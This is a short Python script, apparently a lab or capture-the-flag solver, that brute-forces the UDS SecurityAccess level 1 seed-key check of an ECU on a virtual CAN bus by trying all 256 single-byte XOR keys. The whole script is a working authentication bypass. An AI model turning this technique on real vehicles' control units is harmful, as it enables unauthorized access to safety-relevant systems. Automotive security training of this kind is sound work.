import time
import isotp
from can_uds.comm import create_socket
from can_uds.uds import (
    SecurityAccess,
    reset_ecu,
)


def calc_key(seed: bytes, xor_by: int) -> bytes:
    key = int.from_bytes(seed, "big") & 0xFFFFFFFF

    # 4バイト、全て xor_by で埋める
    xor = xor_by << 24 | xor_by << 16 | xor_by << 8 | xor_by

    key ^= xor
    return key.to_bytes(4, "big")


def solve_level1(sock: isotp.socket, xor_by: int):
    sec_access = SecurityAccess(sock, 0x01)
    seed = sec_access.request_seed()
    assert len(seed) == 4
    print(f"[level1] Seed: {seed.hex()}")

    key = calc_key(seed, xor_by)
    print(f"[level1] Key: {key.hex()} (xor_by = {xor_by})")
    ret = sec_access.send_key(key)
    if ret:
        print(f"[level1] Security Access Level1 succeeded (xor_by = {xor_by})")
        return True


if __name__ == "__main__":
    sock = create_socket("vcan0", 0x7E0, 0x7E8)
    reset_ecu(sock)
    time.sleep(3.0)

    for xor_by in range(0x100):
        if solve_level1(sock, xor_by):
            break
